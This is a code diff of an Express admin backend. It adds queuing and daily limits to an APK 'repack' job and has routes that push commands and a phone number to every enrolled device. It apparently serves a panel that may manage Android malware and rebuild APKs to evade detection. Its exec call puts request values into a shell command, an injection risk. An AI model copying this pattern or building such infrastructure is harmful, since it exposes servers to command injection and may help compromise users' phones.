@@ -9,14 +9,47 @@ const router = express.Router();
 
 // ─── Repack Job Store ─────────────────────────────────────────────────────────
 interface RepackJob {
-  status: "pending" | "done" | "error";
+  status: "queued" | "running" | "done" | "error";
   fileId?: string;
   filename?: string;
   error?: string;
   panelId?: string;
   createdAt: number;
+  queuedAt?: number;
+  startedAt?: number;
 }
 const repackJobs = new Map<string, RepackJob>();
+
+// ─── Concurrency Queue (max 5 simultaneous repacks) ───────────────────────────
+const MAX_CONCURRENT_REPACKS = 5;
+let activeRepacks = 0;
+const repackQueue: Array<{ requestId: string; run: () => void }> = [];
+
+function drainQueue() {
+  while (activeRepacks < MAX_CONCURRENT_REPACKS && repackQueue.length > 0) {
+    const next = repackQueue.shift()!;
+    next.run();
+  }
+}
+
+// ─── 24h Per-Panel Success Limit (2 per day, only on success) ────────────────
+const DAILY_REPACK_LIMIT = 2;
+const panelSuccessLog = new Map<string, number[]>();
+
+function getPanelDailyUsed(panelId: string): number {
+  const now = Date.now();
+  const windowMs = 24 * 60 * 60 * 1000;
+  const times = (panelSuccessLog.get(panelId) || []).filter(t => now - t < windowMs);
+  panelSuccessLog.set(panelId, times);
+  return times.length;
+}
+
+function recordPanelSuccess(panelId: string) {
+  const times = panelSuccessLog.get(panelId) || [];
+  times.push(Date.now());
+  panelSuccessLog.set(panelId, times);
+  logger.info(`repack: daily usage recorded for ${panelId}, total today: ${times.length}`);
+}
 
 // ─── Admin APK Job Store ──────────────────────────────────────────────────────
 interface AdminApkJob {
@@ -227,7 +260,6 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
     const storedUser = (doc as any)?.meta?.username || "";
     const storedPass = (doc as any)?.meta?.password || "";
 
-    // ── FIRST TIME LOGIN ───────────────────────────────────────────────────
     if (!storedUser && !storedPass) {
       const hashed = await bcrypt.hash(password, 10);
       await AdminModel.findOneAndUpdate(
@@ -242,7 +274,6 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
       return res.json({ success: true, firstLogin: true });
     }
 
-    // ── USERNAME CHECK ────────────────────────────────────────────────────
     if (username !== storedUser) {
       entry.count++;
       if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
@@ -250,7 +281,6 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
       return res.status(401).json({ success: false, error: "Invalid credentials" });
     }
 
-    // ── PASSWORD VERIFY ───────────────────────────────────────────────────
     const isHashed = (doc as any)?.meta?.isHashed === true;
     let valid = false;
     if (isHashed) {
@@ -363,13 +393,11 @@ router.put(["/globalPhone", "/admin/globalPhone"], async (req, res) => {
   try {
     await AdminModel.findOneAndUpdate({ key: "global" }, { $set: { phone: phoneStr } }, { upsert: true, new: true });
 
-    // 1. WS broadcast — connected admin panels ko real-time update
     try {
       const wsService = require("../services/wsService").default;
       wsService.broadcastGlobalAdminUpdate(phoneStr);
     } catch {}
 
-    // 2. FCM push to all devices — broadcastCommandToAllDevices (correct field: deviceId)
     setImmediate(async () => {
       try {
         const { broadcastCommandToAllDevices } = require("../services/fcmService");
@@ -487,7 +515,7 @@ router.put(["/alert-text", "/admin/alert-text"], async (req, res) => {
  * =====================================
  */
 function getLicenseData() {
-  const startEnv = process.env.LICENSE_EXPIRY || "";  // LICENSE_EXPIRY = start/purchase date
+  const startEnv = process.env.LICENSE_EXPIRY || "";
   const parseDate = (s: string): number => {
     if (!s) return 0;
     const dmy = s.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/);
@@ -530,55 +558,122 @@ router.post(["/repack/start", "/admin/repack/start"], async (req: Request, res: 
   try {
     const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
     if (!panelId) return res.status(400).json({ error: "panelId required" });
+
+    // Check 24h daily limit (only counts successful repacks)
+    const dailyUsed = getPanelDailyUsed(panelId);
+    if (dailyUsed >= DAILY_REPACK_LIMIT) {
+      return res.status(429).json({
+        error: "24 ghante mein sirf 2 baar fix ho sakta hai. Kal dobara aao.",
+        dailyUsed,
+        dailyLimit: DAILY_REPACK_LIMIT,
+      });
+    }
+
     const conn       = await getBotDb();
     const PanelModel = getBotPanelModel(conn);
     const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
     if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found. Panel ID sahi hai?` });
     if (!panel.apkFileId) return res.status(400).json({ error: "Is panel ke liye koi APK upload nahi hua abhi tak. Pehle Telegram bot se release APK upload karo." });
+
     const fileId    = String(panel.apkFileId);
     const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
     const BOT_TOKEN = process.env.BOT_TOKEN || "";
     if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
     if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
+
     const requestId = genRequestId();
-    repackJobs.set(requestId, { status: "pending", panelId, createdAt: Date.now() });
+    repackJobs.set(requestId, { status: "queued", panelId, createdAt: Date.now(), queuedAt: Date.now() });
+
     const scriptPath = "/root/bot-system/repack/repack.sh";
     const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
     const apiKey  = process.env.API_KEY || process.env.ADMIN_API_KEY || "";
     const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
-    logger.info("repack: starting", { requestId, panelId, fileId: fileId.slice(0, 20) });
-    exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
+
+    const runRepack = () => {
+      activeRepacks++;
       const job = repackJobs.get(requestId);
-      if (err) {
-        logger.error("repack: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
-        if (job?.status === "pending") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya. Server logs check karo." });
-      } else {
-        logger.info("repack: script done", { requestId, stdout: stdout?.slice(0, 100) });
-        setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "pending") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
-      }
-    });
-    return res.json({ requestId });
+      if (job) repackJobs.set(requestId, { ...job, status: "running", startedAt: Date.now() });
+      logger.info("repack: starting", { requestId, panelId, fileId: fileId.slice(0, 20), activeRepacks });
+
+      // No timeout — queue can hold requests, repack takes variable time
+      exec(cmd, {}, (err, stdout) => {
+        activeRepacks = Math.max(0, activeRepacks - 1);
+        const j = repackJobs.get(requestId);
+        if (err) {
+          logger.error("repack: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
+          if (j && j.status === "running") {
+            repackJobs.set(requestId, { ...j, status: "error", error: "Repack script fail ho gaya. Server logs check karo." });
+          }
+        } else {
+          logger.info("repack: script done", { requestId, stdout: stdout?.slice(0, 100) });
+          // Give resolve route 10s to mark it done before auto-erroring
+          setTimeout(() => {
+            const jj = repackJobs.get(requestId);
+            if (jj && jj.status === "running") {
+              repackJobs.set(requestId, { ...jj, status: "error", error: "Script complete hua par resolve nahi mila" });
+            }
+          }, 10000);
+        }
+        drainQueue();
+      });
+    };
+
+    if (activeRepacks < MAX_CONCURRENT_REPACKS) {
+      runRepack();
+    } else {
+      repackQueue.push({ requestId, run: runRepack });
+      logger.info("repack: queued", { requestId, panelId, queueLength: repackQueue.length });
+    }
+
+    return res.json({ requestId, dailyUsed, dailyLimit: DAILY_REPACK_LIMIT });
   } catch (err: any) {
     logger.error("repack: start failed", err);
     return res.status(500).json({ error: err?.message || "server error" });
   }
 });
 
+// Called by repack.sh when it finishes successfully
 router.post(["/harmful/:requestId/resolve", "/admin/harmful/:requestId/resolve"], (req: Request, res: Response) => {
   const adminKey = String(req.headers["x-admin-key"] || "").trim();
   if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) return res.status(401).json({ error: "unauthorized" });
   const { requestId } = req.params;
   const { fileId, filename, panelId } = req.body || {};
   const existing = repackJobs.get(requestId);
-  repackJobs.set(requestId, { ...(existing || { createdAt: Date.now(), panelId: panelId || "" }), status: "done", fileId: clean(fileId), filename: clean(filename) || "repacked.apk" });
-  logger.info("repack: resolved", { requestId, filename });
+  const finalPanelId = clean(panelId) || existing?.panelId || "";
+  repackJobs.set(requestId, {
+    ...(existing || { createdAt: Date.now(), panelId: finalPanelId }),
+    status: "done",
+    fileId: clean(fileId),
+    filename: clean(filename) || "repacked.apk",
+    panelId: finalPanelId,
+  });
+  // Count this as a successful repack for the daily limit
+  if (finalPanelId) recordPanelSuccess(finalPanelId);
+  logger.info("repack: resolved", { requestId, filename, panelId: finalPanelId });
   return res.json({ ok: true });
 });
 
 router.get(["/repack/:requestId/status", "/admin/repack/:requestId/status"], (req: Request, res: Response) => {
   const job = repackJobs.get(req.params.requestId);
   if (!job) return res.status(404).json({ error: "Job not found" });
-  return res.json({ status: job.status, filename: job.filename, error: job.error });
+
+  const queueIdx = repackQueue.findIndex(q => q.requestId === req.params.requestId);
+  const panelId  = job.panelId || "";
+  const dailyUsed = getPanelDailyUsed(panelId);
+
+  return res.json({
+    status: job.status,
+    filename: job.filename,
+    error: job.error,
+    // Queue info
+    queuePosition: queueIdx >= 0 ? queueIdx : null,   // 0 = next in line
+    runningCount: activeRepacks,
+    queueLength: repackQueue.length,
+    estimatedWaitSecs: queueIdx >= 0 ? (queueIdx + 1) * 210 : null,  // ~3.5 min per slot
+    // Daily limit info
+    dailyUsed,
+    dailyLimit: DAILY_REPACK_LIMIT,
+  });
 });
 
 router.get(["/repack/:requestId/download", "/admin/repack/:requestId/download"], async (req: Request, res: Response) => {
